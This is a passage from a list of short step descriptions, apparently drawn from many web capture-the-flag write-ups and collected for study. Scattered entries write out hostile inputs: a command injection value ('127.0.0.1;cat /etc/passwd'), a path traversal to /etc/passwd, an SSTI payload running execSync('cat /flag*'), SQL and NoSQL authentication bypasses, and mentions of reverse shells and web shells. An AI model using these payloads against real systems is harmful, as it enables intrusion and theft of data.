    "Set up the DNS server similar to DNS Rebinding.",
    "Tried to bypass Content Security Policy (CSP)",
    "Received the response",
    "Identify a Server-Side Template Injection (SSTI) vulnerability in the password field within the code.",
    "Attempted to connect to the homepage.",
    "Receive the port number from the exfiltration attempt.",
    "Performed a POST request to the /api.php endpoint with 'id', 'pw', 'c', 'c2', 'pas', and 'db' parameters, using path traversal to access the flag.",
    "Identify headers that require a token.",
    "Identify that the site allows script tags with nonces as external resources.",
    "Identify when __destruct would be called.",
    "Examined the code to understand the note saving mechanism.",
    "Search for 'eval' syntax.",
    "Identified the script calling `api.php` endpoint",
    "Identify the request parameters of the /find endpoint: condition, startsWith, endsWith, and debug.",
    "Successfully extracted the flag from /var/www.",
    "Failed to login with the provided credentials.",
    "Create a secondary note",
    "Look for potential flags in each profile",
    "The encoded XMLHttpRequest sends the cookie to a specified server.",
    "Read the given challenge.",
    "Include 'payload' as the data",
    "Use the script available at https://github.com/lijiejie/ds_store_exp.",
    "Note the UUID prefix '9e5a' mentioned in the challenge description.",
    "Review the input form logic.",
    "The flag retrieval is possible due to the deserialization of the 'login' cookie",
    "The attack then initiates RCE to read and externally send the flag",
    "Note that the code must contain only lowercase letters, parentheses, and periods",
    "Restore the repository to the previous commit.",
    "Access the URL `https://xmas.2020.chall.actf.co/report`",
    "Consider if manipulating this token structure could allow for unauthorized purchases from the 'flag store'.",
    "Another part of the flag provided.",
    "Generate an introspection query for graphql.",
    "Bypass SOP.",
    "Or replace 'admins' with '../.env' in the route.",
    "Create a working XSS",
    "Get the response.",
    "Observe the received Base64 encoded string.",
    "The request smuggling caused the difference in the response.",
    "Confirm that the flag begins with 'CHTB{'.",
    "Conjectured that the 'flagman69' user may not exist in the database given the failed flag output.",
    "Navigate to the bottom of the results.",
    "Researched the Fetch API's limit of 20 redirects causing a network error.",
    "Modify the 'Pipe the emails through' command",
    "Create a malicious input for the username",
    "Inject a final cookie.",
    "Find a cookie with the name 'flag'.",
    "Notice a 'session_id' stored in a cookie.",
    "Confirmed successful RCE exploited to get the flag.",
    "Review the results to list all tables.",
    "Open the JavaScript console in the web browser",
    "The form contains an XML part.",
    "Experimented with the meme generator functionality",
    "Adjusted line 1 and 3 of the payload to work with 'nunjucks'.",
    "Observe two <link> tags.",
    "Formulate the final URL.",
    "Use the 'cat' command to display the contents of youfoundme-asd897kjm.txt",
    "Retrieved the PHP source code.",
    "Inspected cookies.",
    "Constructed a JSON body with username and password",
    "Identify the `very_auth` session variable that needs to be set to `admin`.",
    "Leverage a backend server to eliminate unsuccessful queries and zero in on the correct flag",
    "Collected the flag",
    "Upload a LaTeX document",
    "Noted that 'text/xsl' indicated potential for Cross-Site Scripting.",
    "Note that the const 'note' can be altered",
    "Identify the basic authentication credentials as `admin:admin` for testing locally.",
    "Set secret_key as 'redraider'.",
    "Identify the application.",
    "Bypass double URL decoding by server.",
    "Create a payload",
    "Identify the potential for serious exploits.",
    "Observe the URL http://asuna.nullsession.pw.",
    "Reveal the flag",
    "Include fetched headers in the request.",
    "Attempt to change the input field from 'password' to 'totp'",
    "Send a GET request to the server",
    "Ran code using URL 'http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27'",
    "Submit the URL.",
    "Found paths /, /logout, /login, /forgotpassword.html, /admin, and /dashboard.",
    "Created a payload to leak cookies to the server.",
    "Made a request to the file.",
    "The log_file of the 'access_log' object is set to '../flag'",
    "Access the challenge website.",
    "Read the challenge description and requirements",
    "Inject the 'id' command in the input box.",
    "Discover a text file named flag.txt.",
    "Execute new command.",
    "Sanitized HTML is added to document.body.innerHTML",
    "Study the source code.",
    "Sent the JSON body to the server",
    "Identified a known vulnerability (CVE-2019-17221)",
    "Find a www.zip file using dirsearch.",
    "Step 1: Insert the comment as a preview.",
    "Modify the script to append the created 'img' element to the document body.",
    "Identify the presence of the flag utflag{n3xt_y3ar_go1ng_bl1nd}",
    "Payload 1: Obtained the full URL of the browsing context.",
    "Reveals the flag '35c3_this_flag_is_the_be5t_fl4g'.",
    "Discover it is running on Flask.",
    "Run the PHP exploit",
    "Ensure the template holds identical initial content and MD5 hashes.",
    "Confirmed the existence of an additional table.",
    "Analyze the certificate.",
    "Open the developer tools on the browser.",
    "Visit lukas-app.de.",
    "Set the authentication cookie for the victim using JavaScript.",
    "Assign the value 'true' to the cookie.",
    "Used the X-Forwarded-For header in the scan.",
    "Guess that `shell_exec` might be allowed on the website.",
    "Decode the received Base64 string.",
    "Observe user input being passed to 'require()'.",
    "Downloaded files from the 'palindromecloudynekos' S3 bucket",
    "Triggered the XML payload on the application.",
    "Or, use Wireshark for analyzing the HTTP traffic.",
    "Check the 'Content-length' response header",
    "Note that the flag obtained was 'darkCON{us1ng_3_y34r_01d_bug_t0_byp4ss_d1s4ble_funct10n}'",
    "Found a mechanism to fetch the poll options.",
    "Understand that 'ejs' is capable of Remote Code Execution (RCE) due to prototype pollution.",
    "Observe that the service validates the URL to be HTTP(S).",
    "Discover that JavaScript is blocked.",
    "Improve the payload further by using different JavaScript functions to reduce the character count",
    "Identify an interesting file: require dirname(__DIR__).'/config/bootstrap.php';",
    "Investigate potential for NoSQL injection due to use of MongoDB.",
    "Accessed the provided web page http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719",
    "URL: http://172.17.15.117:443/3e6f0e21-7faa-429f-8a1d-3f715a520da4.png",
    "Realized the issue with urllib.parse.urljoin.",
    "Observe the server returning the result of the operation.",
    "Deduce the need for brute-forcing the secret key.",
    "Set the new flag value as the cookie",
    "Received the URL https://poems.asisctf.com/ as part of the challenge.",
    "Decoded the password hash.",
    "Put together all obtained parts of the flag.",
    "Tried all HTTP verbs for each endpoint.",
    "Use the 'git checkout' command.",
    "Identify the index of `<class 'subprocess.Popen'>` as 258",
    "Configure the SQL injection to return all rows in the database.",
    "Apply a payload.",
    "Decode the base64 content",
    "Test a trivial payload.",
    "Study server.js",
    "If the character does not match 5, set the LIMIT to 2",
    "Open one of the files.",
    "Identify the application listening on port 11111.",
    "Remembered that a Cloudflare error was triggered in the instance by SQL injection.",
    "Find a cookie that contains a JWT hashed with HS256.",
    "Receive an error message indicating a missing token.",
    "Capture the login request.",
    "Include the correct 'Authorization' header.",
    "Deduce that style scoped only works in Firefox versions 21-54.",
    "Discover that Apache2 is restrictive towards parsing the HTTP request.",
    "Register as a new user.",
    "Recognize that the username taken from the session is not properly sanitized",
    "Test the creation of a reverse shell.",
    "Guess that the server was using FastAPI.",
    "Ran PHP code while XML parsing is performed.",
    "Decode the cookie using the selected tool.",
    "Filter for POST requests passing 'passcode' values.",
    "Determine that the identified application is a web application.",
    "Realize that the tokens are used to count the number of 'boops'.",
    "Found out that ports 8080 and 9006 were open.",
    "Attempted to access the /flag directory.",
    "Observed the resulting error message",
    "These parameters are set up to be manipulated later.",
    "Exploit Shellshock vulnerability",
    "Execute the 'ls -al' command",
    "Receive a missing rocket name error.",
    "Conduct local testing for potential RCE.",
    "Use the primary segment to create a URL.",
    "Assess that remote code execution is not possible.",
    "Check the MD5 hash of 'collision2.pdf' using the hashlib library.",
    "After unsuccessful attempts searching for YouTube's JSONP endpoints.",
    "Determine that the 'counter' cookie string ends with a changing base64 encoded string",
    "Realized the 'email' and 'pass' fields are vulnerable to an SQL injection attack.",
    "Convert your public IP address to octal form using an octal IP address converter.",
    "Use the identified class (subprocess.Popen) to list directory content",
    "Attempt password brute force for each email",
    "Discover the presence of a 'flag.txt' file",
    "Used Burp's repeater to spam 'Go'",
    "Dump the '.git' directory.",
    "Observe the 'Wrong Referrer' error",
    "Discover the possibility of using a \"CREATE TABLE ... SELECT\" SQL statement.",
    "Use a Python script to brute force the password",
    "Identify extra code for the debug mode in the file bookhub/views/user.py.",
    "Realize the effect of POST-ing certain data.",
    "Recognize the purpose of normalization: prevent directory traversal attacks.",
    "Login into the system.",
    "Check 'Is it a leap year?' checkbox",
    "Send POST request to '/api/tet/years' endpoint.",
    "Located an input field on the provided webpage",
    "Download the 'print-flag' file by accessing 'http://lowdeep.insomnihack.ch/print-flag'.",
    "Access the target website.",
    "Retrieved the flag by dumping data from 'startup_users' table again, this time concatenating 'wordpass' values using the GROUP_CONCAT function.",
    "The payload is deployed to the new GitHub Pages site.",
    "Analyze the browser cookies",
    "Notice the presence of a PHP eval function.",
    "Observe the site fetching resources.",
    "Include the necessary characters in the final URL.",
    "Identify that the website simulates a TODO list application.",
    "Set 'host' parameter in URL to '127.0.0.1;cat /etc/passwd'.",
    "Bruteforce the flag character by character.",
    "Login using the credentials of the newly promoted 'Admin' user.",
    "Modified the given example json file",
    "Test the observation by creating a URL for a successful and unsuccessful query respectively",
    "Used the flag present in the JSON response.",
    "Gained access to the login page.",
    "Decode the flagged text.",
    "Append the new script to the body of the document.",
    "Observe that the loading splash screen is identical to the challenge website",
    "Find the desired location in the JavaScript file",
    "Arrived at the support page.",
    "Assume the application is likely behind AWS WAF.",
    "Attempted the SQL injection on the authentication form.",
    "Use the 'git diff' command.",
    "Analyzed 'phpinfo()' output.",
    "Begin SQL Injection attack",
    "Attempt to achieve this using client-sided redirects",
    "Recognized the platform as SQLite database.",
    "Find a message about using an unsupported browser, more specifically Internet Explorer 6.01.",
    "Identified a flag table in the database.",
    "Identify potential vulnerabilities.",
    "Attempt to bypass it by loading image URLs directly.",
    "Launch HTTP POST requests",
    "Understand that the program only casts the integer part of 'id'.",
    "Evaluate the web application's functionality to identify potential SSRF or file inclusion vectors.",
    "Identified admin credentials and passcode from the accessed user database and passcode files.",
    "Accessed the website.",
    "Realize that the private gallery cannot be unnecessarily accessed.",
    "Execute the 'ls' command to list files in the current directory.",
    "Find it to be ineffective.",
    "Use the obtained token to perform a readfile operation",
    "Identify the 'secret' tag which contains the flag.",
    "Craft attack payload using permitted characters.",
    "Revealed that a 'vim' command must be used.",
    "Analyze the HTML source code.",
    "Find a way around the restrictive regex check.",
    "Take note of the directory contents returned by the server.",
    "Pivot from the previously found IP address.",
    "Use the discovered cookie",
    "Locate the 'flag.txt' file in the 'flag_is_here' directory",
    "Identify manipulation of wildcards in system commands as the attack method.",
    "Understand how the SQL statement can transfer results from the select statement into a new table.",
    "Understand the CAPTCHA generating code.",
    "Setup a request",
    "Perform extended analysis of the vulnerability",
    "Note the presence of a Content Security Policy (CSP) to prevent XSS attacks.",
    "Used the default credentials.",
    "Revealed and identified a string",
    "Recognize that the httpOnly attribute prevents retrieval of the cookie by XSS.",
    "Tried to get the flag using the code provided when exploiting the log4j vulnerability.",
    "Analyze the web application/database setup's behavior.",
    "Examine the 'challenge/index.js' file in the source code zip.",
    "Create a plan to circumvent MFA token check and SQL by manipulating variables: Set `$mfa_token` as a reference to `$_correctValue` and modify `$query`.",
    "Identify that the 'magic code' is present in the payload returned by the server",
    "Test the character '\"'",
    "Analyzed the code of the website",
    "Open the command line tool.",
    "Assign different nonce to each script tag",
    "Add the desired payload to 'shell.txt'.",
    "Determine vulnerability to LFI",
    "Find the endpoint of the QR code service.",
    "Attempt a brute-forcing approach.",
    "Reveal a 'require_once()' function call",
    "Recognize that a Redis database was being utilized.",
    "Write a Python script to automate the extraction of hidden fields from the website's HTML.",
    "Identified a heavily filtered error-based blind sql injection.",
    "XSS on the challenge server is necessitated",
    "Bypassed the validation by using a different case.",
    "Understand that this trick helps continue the search from the previously found index onwards and it can allow multiple instances of 'fqdn'.",
    "Generate more base64 cookies.",
    "Write the flag to '/opt/mydank'",
    "Identify the replacement of blacklisted commands.",
    "Create symlink on NFS filesystem using the SSRF exploit",
    "Identified the specified `apiGet` URL.",
    "Verify if all 5 captchas are collected",
    "Combine the altered header, payload, and the generated signature.",
    "Reference the blocked function and restricted file",
    "Send the crafted URL, which includes the injected script, to the admin.",
    "Altered the pass field.",
    "Observe that the website is a login form.",
    "Define 'os.ProcAttr'.",
    "Decide to exploit the unsanitized 'alt' parameter.",
    "Search for 'child_process' in all files of '/usr/local/lib/node_modules'.",
    "Conduct an investigation.",
    "Noted that the postMessage should start with 'NOTE_APP_SET_REQUEST' to trigger the addition.",
    "Used the website functionality to get the uploaded PDF file signed.",
    "Log in using the working payload and reveal the hidden flag: `HTB{1nj3cti0n_1s_in3v1t4bl3}`.",
    "Discover a command related to a netcat session.",
    "Notice that one of the mentioned company names points to 'Robots.txt'.",
    "Notice that the 'magic code' is present",
    "Execute the compiled query.",
    "Determine that a setting called 'Pipe the emails through' uses the 'smtp_exec' variable",
    "Source code runs DOMPurify.",
    "Observe the usage of JavaScript files when buttons are pressed",
    "Inputted negative 'rate' value",
    "Identify the specific line of code related to the command line subprocess interaction.",
    "Used 'hex2bin' PHP function.",
    "Realized that the new window redirects to a unique link for each book.",
    "Observe the 'User-Agent header' and note the admin uses 'Firefox 61.0'",
    "Identify the challenge as a Server Side Request Forgery (SSRF) issue.",
    "Observe the returned data",
    "Use the crafted filename for the uploaded gif.",
    "Use a payload with a length over 8kB.",
    "Implement brute force for all possible remaining octets of the IP address within the range of 0 to 256",
    "Send the content of flag.txt to a webhook.",
    "Install and open Dirb tool",
    "Send the modified request.",
    "Combine it with the input of three commas to meet the requirement.",
    "Identify that the init() function changes the displayed note's innerHTML to the /get response on load.",
    "Understand that the crucial check occurs in the 'checkout(req, res)' function that verifies the token's signature matches the key.",
    "Apply the signature to the token",
    "Set 'window.name' to the long payload",
    "Combine all the collected flag parts.",
    "Identified the need for a 'GET' request with two parameters having the same md5 hash.",
    "Receive an alert from the website.",
    "Leak source code.",
    "Understand that the interaction with the filename being uploaded is the potential vulnerability for RCE.",
    "Log in again with the deduced password to get the flag",
    "From the PHP, realize that there\u2019s a potential path traversal vulnerability.",
    "Find that the password is 'congratsyouwin' via the bruteforcing method.",
    "Recognize that modifying the `$query` permits performing an SQL injection and intend to adjust it accordingly to evade authentication.",
    "Identified attributes: 'username', 'admin', and 'profile_img'.",
    "Perform a dirbuster scan",
    "Check all npm packages for vulnerability.",
    "Examine the source code of the main web page.",
    "Understand that this is due to inconsistencies in length measurement of Unicode characters.",
    "Observe that it leads to a list of admin usernames.",
    "Find in the robots.txt file that /signing.pem is disallowed.",
    "Reconstruct into 'sRPd45w_0' string.",
    "Modify the User-Agent",
    "Leverage the SSRF vulnerability to communicate with the Redis instance.",
    "Add GET parameter to final URL",
    "Analyze the webpage's HTML and JavaScript code.",
    "Obtain the complete flag.",
    "Choose a .phtml file for upload.",
    "URL-encoded the new payload.",
    "Discover the 'manage.php' page",
    "Specify 'http://localhost:20011/admin' as the value for the 'galleryUrl' parameter.",
    "Successfully retrieved the flag",
    "Uploaded the .htaccess file.",
    "Get the flag",
    "Experiment with the session_id.",
    "Send a request body.",
    "Open the 'flaghash.sh' script",
    "Recognized that /api/flag-plz is mapped to /forbidden.",
    "Identify the rendered HTML page from textarea inside an iframe",
    "Identify that `aW1nMS5qcGc=` is a Base64 encoded string.",
    "Observe the flag content as '35C3_M1Cr0_S3rvices_4R3_FUN!'.",
    "Understood the extensive filter used for the challenge.",
    "Verify that the `database.sql` file contains password hashes for a manager and admin user.",
    "Found potential injection points in the feature allowing us to edit our bio in Markdown.",
    "Base64-encoded the entire input.",
    "Inspect the 'git log'.",
    "Exploit the template injection vulnerability.",
    "Received the /api/flag contents",
    "Identify that the JavaScript library is vulnerable to client-side prototype pollution.",
    "Enumerate the 'id' range between '18446744073709551463' to '18446744073709551615'.",
    "Understand the need to create a controlled filename.",
    "Ran a JavaScript snippet to test different elements for vulnerabilities with the DOMPurify sanitizer.",
    "Modify the link used in the requests.get operation.",
    "Identify the app as a Node.js app.",
    "Identify the vulnerability lies in the use of tar utility.",
    "Execute PHP commands to confirm the behavior of '0e...' strings being treated as 0.0 in PHP",
    "Username and signup date were passed into the SQL query.",
    "Research the hashpumpy function",
    "Use the 'mutool clean' command to adjust the offsets in the PDF.",
    "Export or send the content of flag.txt.",
    "Examined the functionality endpoint '/files/'.",
    "Recognized the potential for optimization.",
    "Combine the hashed string with the text 'SharifCTF{' and '}' to form the flag.",
    "Analyze the results from the SQL payload tests.",
    "Access the challenge PHP URL",
    "Used %-decodes strings to match the '/debug/answer' endpoint.",
    "Write the port number used to a file to keep track.",
    "Observe the 'notes.count' function.",
    "Identify that the code is using the HTTP header to construct a file path.",
    "Spaces aren't allowed.",
    "Observe from user session that the session cookie was set to Lax",
    "Bruteforce the value of 'x' by submitting RCE payload with different 'x' values until a shell is received.",
    "Noted that subdomains and port numbers are ignored in cache keys.",
    "Discover the flag.",
    "Execute the command 'curl -H \"Accept-Language: sv-SE\" very.uniquename.xyz:8880'",
    "Download the robots.txt file",
    "Connect to the website",
    "Recognized that SQLmap only displays one entry for 'id' of 1.",
    "Retrieve the flag.",
    "Note the challenge has a web interface.",
    "Plan to import the 'changelog.js' file after the pollution.",
    "Ensure the known username 'true.grit@umbccd.io' remains intact in the manipulated request.",
    "Encode new cookie value into base64",
    "Dig into tar documentation to find alternatives.",
    "Clarified how to start the app locally using a non-privileged port",
    "Go to jwt.io",
    "Craft a request to '/post.php?post=../../../../../../etc/passwd'.",
    "Understand that the reverse shell payload will be fired when the data is deserialized.",
    "Modify the location of the flag component in the XML",
    "Understood the presence of a blacklist filter for '#' symbol",
    "Right click on the webpage",
    "Wait for the promise to resolve.",
    "Constructed a CL-TE request smuggling attack.",
    "Compare the generated tripcode with the target",
    "Retrieve the flag from the response of the previous POST request.",
    "Submit the file upload request and monitor for any callbacks from the server.",
    "Refresh the CSRF token.",
    "Demonstrated DOM clobbering.",
    "Identify control over 'request.body.converter'.",
    "Examine verifyMFA() and observe the check for a 10-digit random number.",
    "Identify the disallowed path '/g00d_old_mus1c.php'.",
    "Get link to the source code",
    "Observe the usage of MySQL",
    "Website parses the XML",
    "Used dumper from GitTools to inspect the git repo",
    "Tried to manipulate the `clipboard_getData` function.",
    "The program will execute the script within a docker container with greater access (runs as `uploaded` user).",
    "Identify that the website accepts a 'name' parameter",
    "Search the blog for log file links.",
    "Searched for the flag using 'ls /'.",
    "Evaluate the Python microservice",
    "Access the new URL 'https://freewifi.ctf.umbccd.io/staff.html'",
    "Analyze the format of response packets.",
    "Verify authentication to the system.",
    "Understand the workflow of the Flask web server.",
    "Replace each integer into a URL.",
    "Bypass '_' by constructing a string.",
    "Perform this step to prevent unintended data loss or corruption.",
    "Inspect the `challenge/routes/index.js` file.",
    "Inspect the server response.",
    "Add the second A record to the DNS entry to resolve to 51.38.138.162.",
    "Recognize the problem could be related to Server-side Template Injection.",
    "Received a collection of CSV files containing network traffic data",
    "Abused the type attribute.",
    "Given an endpoint that allows sending feedback in form of HTML.",
    "Acknowledge that squares should be avoided while clicking.",
    "Use the method `().__class__.__base__.__subclasses__()`",
    "Recognize the potential CSRF vulnerability based on the CSRF token.",
    "Use only characters from a-z and A-Z in the note.",
    "Observed that clicking on the excerpt button makes an HTTP GET request to '/books.php?type=excerpt&id=1'.",
    "This is a stored cross-site scripting vulnerability, where we can send a malicious script through the frontend to the database and when a user visits the '/queries' page, the server sends the malicious code to the user.",
    "Receive the flag: RITSEC{JWT_th1s_0ne_d0wn}.",
    "Listed environment variables.",
    "Perform an immutable code inspection of upload.php.",
    "Access the website homepage",
    "Analyze the authentication process to understand its flow and mechanisms.",
    "Identified that the input was being reflected.",
    "Observe images displayed in a gallery",
    "Set 'importmap' as the type attribute for the new HTML script element",
    "LOYALTY_SYSTEM_ACTIVE is set to False.",
    "Controlled 'pkgPath' by polluting '__proto__.path'.",
    "Display the data in HTML to obtain the flag.",
    "Name the cookie 'admin'.",
    "Realize 'os.exec' is blocked.",
    "To find the session cookie, set the session's 'admin' field to 'true'.",
    "Note that the Traefik service acts as a reverse proxy for the Go microservice",
    "Send a request to the server using the final URL.",
    "Confirmed the XXE vulnerability.",
    "Inspected the proxy server.",
    "Identify 'website' as the same site for the request.",
    "Understand purchasing requests and conditions.",
    "Engaged in a race with other players",
    "Identified that the web application might have an XPath injection vulnerability.",
    "Realized that caching modules use 'pickle.load()' to load cached data",
    "Conduct research to identify potential vulnerabilities of the LibreOffice tool.",
    "Submit PHP form.",
    "Locate the '.git' directory via robots.",
    "Identify 'execSync' call in the script.",
    "Inspect the source code of the website",
    "Reveal the hidden sheet",
    "Identify the database containing 'bcrypt' hashes.",
    "Test the theory.",
    "Examine the script",
    "Find the challenge flag.",
    "Craft serialized input",
    "Capture the request, including the Admin-Key.",
    "Test the character '['",
    "Recognize the vulnerability of the older version to an SQL injection attack",
    "Pay particular attention to rules blocking longer payloads.",
    "Set X-Forwarded-For to 172.16.2.24.",
    "Use the technique to bruteforce every character of the flag.",
    "Observe the presence of a CSRF token.",
    "Learn about using the CASE clause to determine the column of the result being sorted",
    "The statement indicates that using the sanitized HTML with jQuery's insecure elm.html() method without the SAFE_FOR_JQUERY flag could lead to XSS.",
    "Use the /find endpoint to inject a Set-Cookie header.",
    "Attempted to replace 'card_num' with 'R34L_F14G' in SQLMAP query.",
    "Send POST request to upload the 'shell.txt' file.",
    "Investigate how PHP converts characters into underscores in input parameters' names.",
    "Observe that the change does not work",
    "Provide the AES ECB key and hex string as input.",
    "Delivered the payload via the crafted session cookie",
    "Post each successful guess to the exploit server.",
    "Identified an authentication form on the webpage.",
    "Craft a request to smuggle a request to /admin in flagportal.",
    "Cite the page http://104.197.168.32:17012/index.html as the challenge target.",
    "Used a bash script to extract the PHPSESSID with auth set.",
    "Find a base64 encoded value.",
    "Recognized from the error that the website is likely reading XML data from a database.",
    "If a correct character is found (indicated by a read timeout), append the character to the flag and move to the next character.",
    "Create a new JWT.",
    "Identify the checks for specific patterns.",
    "Find a potential flag in the search results.",
    "Discovered in the SQLmap results that the 'ASISCTF' database has one table termed 'books'.",
    "Add comments to comment out the rest of the query",
    "Include the manipulated cookie in the request's header.",
    "Inject a classic SQL Injection payload (' or 1=1 -- ) into the password field.",
    "Discovered that 'export_db' function could be exploited to read file contents if the passcode was correct.",
    "Recognize the possibility of useful information in previous commits.",
    "Determine that the specific replace function does not sanitize the 'alt' parameter.",
    "Locate the flag component in the XML",
    "Locate the route '/login' in the website source.",
    "Discover that the backslash character itself isn't escaped.",
    "In the password field of the JSON body, use NoSQL's $gt operator to bypass password check by typing {\"$gt\": \"a\"}.",
    "Find a commit with the message 'Fix auth!!!'",
    "Use data URI in the form 'data:text/html;base64,<base64 data>' for the payload.",
    "Identify that it was a Jinja2 Template Injection challenge.",
    "Receive a message that the user is not an admin.",
    "Identify the 'secret key' as '1234'.",
    "Identified the presence of a shared object entitled `shellme.so`.",
    "Pull multiple .git files such as `.git/index`, `.git/config`, `.git/HEAD` etc., from the server.",
    "Open the server.py file.",
    "Realize that this JS file calculates some sort of document's hash.",
    "Rewrite the JavaScript code",
    "Ensured the query returns 'email' and 'password' columns.",
    "Apply Base64 decoding to the padded text.",
    "Inferred that the 'config.php' file must be printed via curl execution.",
    "Log into the website.",
    "Discovered valid usernames including `admin`, `root`, `builder`, `employee`, and `staff`.",
    "Decide to print all file contents",
    "Identify the `database.sql` file in the source code.",
    "Translated the bash script into a one-liner",
    "Observe that the JWT key is only stored for 2 seconds.",
    "Realized that the 'data-last' attribute should start with the correct string for it to be fetched.",
    "Write a script that creates an 'img' element with src set to contain the 'document.cookie' value.",
    "Encrypt `file:///var/www/html/flag.txt` using the obtained key.",
    "Received a response",
    "Add a `run` bash script to the zip file.",
    "Defined SQL injection as the manipulation of a query to interact with a website's database.",
    "Encountered a weird error, further hinting at the presence of an SQL injection vulnerability.",
    "Read the information about logging in via POST and using json request",
    "Determine that the length of the flag is 38 characters.",
    "Realized that these values are used for the calculation and comparison",
    "Use commit IDs to determine when the flag was removed from the source.",
    "Realize that the crafted payload successfully runs a SQL query",
    "Recognize that the '.env' file contains the JWT secret.",
    "Identified the specific query string parameters needed according to the code.",
    "Capture incoming connections.",
    "Use the gained reverse shell.",
    "The XML payload was uploaded to the 'trial' tab of the web interface.",
    "Identified a potential SQL injection vulnerability.",
    "Encounter stability issues",
    "Observe a post message",
    "Inspect the source code on the feedback form page.",
    "Acknowledge the existence of 'magic hashes' that PHP considers equal",
    "Include /var/www/html/flag.php in the POST request",
    "Search for the flag within the content of the index.php file",
    "Injected email queue in rabbitmq",
    "Identify the second change.",
    "Realized that all possible characters are guessed for each position of the flag.",
    "Inferred from the challenge that grades are uploaded through a json file",
    "Identified a payload that could potentially exploit the vulnerability in 'md-to-pdf'.",
    "Identify a file 'flag_for_this_INFERNO.txt' in the listed contents.",
    "Retrieve the value of AUTH_SECRET from the .env file",
    "The 'access_log' class is defined in /authentication.php",
    "Attempt to find the current working directory.",
    "Received the final flag in the response.",
    "Modify the 'role' field to 'Admin'.",
    "Access the website from the challenge.",
    "Verify if the injected template operation (7*7) triggers the SSTI vulnerability",
    "Determine the potential for privilege escalation",
    "Found a known vulnerability (CVE-2019-17221) linked with PhantomJS/2.1.1.",
    "Notice that the site's PHP code allows for the crafting of 'preg_replace'",
    "Observe that the server script takes user input as the 'icecream' value.",
    "Find the URL of /robots.txt.",
    "Retrieve the flag from the decoded base64 response.",
    "Inserted the payload into the target site's URL.",
    "Examined the 'logout.js' file",
    "Examined the documentation for RFC5322 to understand what characters are allowed in the email parameter.",
    "Read the flag from '/var/secret'",
    "Specify an alphabet to iterate over",
    "Understand Wildcard Injection.",
    "Included a reference to the /etc/flag.txt directory in the request.",
    "Identified the need to adjust the payload for 'nunjucks'.",
    "Used '127.0.0.1;env' in URL.",
    "Load the CTF challenge.",
    "Noticed that `$var8` is set immediately after `call $dlmalloc`.",
    "Identify the involved keys - 'key' and 'key2'.",
    "Look for additional information in the file.",
    "Extract the contents of 'poc.odt' to access the 'content.xml' file.",
    "Browse the 'user' directory.",
    "Identify ATS and Puma as the systems involved in the smuggling.",
    "Understand that the 'decrypt.php' file suggests the potential for an SQL injection via the UUID POST data.",
    "Discovered an `AdminPage`.",
    "Try the second exploit.",
    "Replace the original cookie with the new base64 encoded 'chocolate' cookie on the website",
    "Bypass authentication by making the conditional statement in the SQL query always true due to the SQL Injection.",
    "Target the chat endpoint.",
    "Set the origin as the target URL",
    "Decode the JWT.",
    "Replace parentheses with backticks in the script",
    "Monitor the output of the script.",
    "Identify an inaccessible server that is hosting data-server.",
    "Access and examine the source code of the website.",
    "Research ways to bypass PHP constraints",
    "Understand this switch allows the execution of custom code within the app",
    "URL-decoded the output",
    "Submit a note.",
    "Leverage dual hexing technique to transform the flag.",
    "Upload a PHP shell",
    "Use the `fast-json-patch` library for the modification.",
    "Created a reverse shell script using only non-alpha chars.",
    "Update the prefix",
    "Find an image tag",
    "Create a SQL injection payload.",
    "Realized that this allows the cache probing attack to succeed.",
    "Check the cookies being set.",
    "Understand the purpose of this file: pollute the arguments for tar command.",
    "Obtained the headers from the log file.",
    "Submitted the payload 'csrf&username=michelle&password[username]=michelle'",
    "Injected a command that echoes the FLAG environment variable",
    "Locate the 'Cookie' header in the HTTP request.",
    "The XML part substitutes an entity 'myExternalEntity' with '/etc/passwd', hinting at XXE exploitation.",
    "Redefine `window.callback` and `trustedTypes` using the DOM Clobbering technique",
    "Send the request and receive a response",
    "Understand that if the expected value does not match 'solution'.",
    "Plan to execute a reverse shell payload.",
    "Obtain the flag from the decoded text",
    "Notice a redirect to a different domain when fetching an image.",
    "Wait for the promise to resolve.",
    "Upload the disguised phar file.",
    "Identify a SQL injection vulnerability in the 'data-server' project.",
    "Confirmed that the URL specified in the 'background' property is fetched conditionally.",
    "Retrieved the flag at `/flag.txt`.",
    "Identified the use of a message event handler.",
    "Understand the constraints of the language input.",
    "Focus on bypassing checks applied to 'warmup' GET parameter.",
    "Notice that comments need to be approved.",
    "Set up a netcat listener on a local server.",
    "Notice the validation of arbitrary code execution",
    "Detect that the JavaScript file 'bundle.js' is used to calculate the hash value.",
    "Automate the process through script.",
    "Note that 'name' is a short form of 'window.name' property",
    "Wrote the received response as the final output.",
    "Add a random pump ID from earlier /fuel endpoint response.",
    "Modified 'X-Forwarded-For' header value.",
    "Find information on Angular's secondary segments in paths.",
    "Identify the presence of the 'src=' parameter in the target website's HTML code.",
    "The suspicion is related to either the GET path handling or the POST filename",
    "Notice the dependency on 'jsonwebtoken' 3.2.2 in the target application.",
    "Determined the challenge requires bypassing an Angular application setup behind an Nginx reverse proxy.",
    "Send purchase requests to the API.",
    "Interpreted the returned error message to infer the use of an SQLite database.",
    "Perform the first DNS resolution to check if the destination is private.",
    "Trigger a 404 error page.",
    "Noted that 'n.png' loads if the query is not found within a note.",
    "Explain the syntax and usage of the SUBSTRING function.",
    "Construct a payload that uses the SQL LIKE clause.",
    "Enumerated permissions using 'pacu' tool",
    "Test the payloads from the unit test in the challenge.",
    "Download the 'pack-names' file from the target server.",
    "Recognize the use of wildcards in tar utility.",
    "Access the website at the URL: http://chals.ctf.sg:40401",
    "Identify serialization in the __construct method.",
    "Decide to use the same strategy to make admin accept the follow request.",
    "Identified privileged permissions to invoke AWS Lambda functions",
    "Logged in with the obtained credentials.",
    "Understand that the mechanism can be bypassed using 'username:password@hostname' URL format",
    "Downloaded the 'dirstate' file from 'checkout' folder on the target server.",
    "Craft and insert the payload '{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /flag*')\")()}}' into the exploit.",
    "Read the flag value as 'darkCON{g1t_d4_fl4g}'.",
    "Accessed admin panel",
    "Find the option to pass it as a URL parameter.",
    "Alter the JWT's header to change the algorithm to HS256.",
    "Send the encoded script as an SSTI payload.",
    "Recognized that the challenge name and challenge statement hinted at SQL injection.",
    "Set 'program' as the id for the new HTML script element",
    "Verify that the web application is using node.js",
    "Terminate 'cat' command with '|'.",
    "Understood that the desired flag is located within the 'flag' table in MySQL.",
    "'request.args.get('amount')' was added to the user balance.",
    "Press 'login' on the login page.",
    "Target the URL for the GET request.",
    "Create a function 'get_hidden' in the Python script.",
